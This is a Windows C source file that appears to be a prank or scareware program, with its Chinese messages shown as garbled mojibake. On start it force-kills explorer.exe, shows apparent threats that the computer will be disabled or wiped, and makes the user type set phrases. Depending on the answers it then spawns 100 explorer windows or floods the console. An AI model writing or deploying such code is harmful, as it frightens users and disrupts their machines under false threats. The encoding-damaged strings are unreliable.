#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<windows.h>
void over(void){
	int i;
	printf("\n\n\t\t������!!!");
	for(i = 0;i<10000;i++){
		printf("������!!! ");
		if(i%10==0) printf("\n");
	}
	Sleep(3000);
}
void son(void){
	int i;
   	system("cls");
   	printf("\n\n\t\t������������Թ��ˣ�\n");
	for(i = 0;i <100;i++)
		system("start explorer.exe");
}
int main()
{
	int i;
	char a[12],b[12] = {"���Ǵ���"},c[12] = {"�ְ�"},count = 0;
	system("taskkill/im explorer.exe /f");
	system("cls");
	printf("\n\n\t\t@����!���м��ˣ�����㲻����˵��������ĵ��Խ���̱����");
	loop:
		printf("\n\n\t\t�������ͼ�رմ˳���,��ĵ��Խ��ᱻɾ��ȫ������!!!\n");
		printf("\n\n\t\t$��˵\"���Ǵ���\",������ڿ��������ֵ�����¸��Ҵ����������򲻳�����������ˣ�\n>>");
		scanf("%s",a);
		if(strcmp(a,b)==0){
			printf("\n\n\t\t$�ٽо�\"�ְ�\",�ͷŹ���!\n>>");
			scanf("%s",a);
			if(strcmp(a,c)==0){
				son();
   				return 0;
			}
			else{
                printf("\n\n\t\t����һ�λ��ᣬ��\"�ְ�\"!\n>>");
                scanf("%s",a);
                if(strcmp(a,c)==0){
					son();
   					return 0;
				}
					else over();
				}
		}
		    else if(count == 0){
				printf("\n\n\t\t$�ٸ���һ�λ���!�ٲ������͸������ɫ����!\n");
				count++;
				goto loop;
			}
				else over();
	return 0;
}
